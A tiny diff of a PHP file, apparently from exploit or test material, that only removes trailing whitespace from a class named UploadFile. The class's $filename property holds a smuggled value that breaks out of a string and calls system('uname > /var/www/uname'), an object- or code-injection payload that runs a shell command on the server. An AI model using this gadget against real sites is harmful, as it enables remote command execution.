@@ -1,5 +1,5 @@
 <?php
-class UploadFile { 
+class UploadFile {
   public $filename="'.system('uname > /var/www/uname').'";
 }
 
